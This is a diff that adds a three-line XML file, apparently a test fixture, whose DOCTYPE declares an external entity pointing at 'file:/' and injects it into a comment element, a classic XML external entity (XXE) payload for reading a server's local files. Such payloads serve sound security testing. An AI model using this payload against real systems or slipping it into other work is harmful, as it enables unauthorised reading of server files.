@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:/">]>
+<comment><text>&xxe;</text></comment>
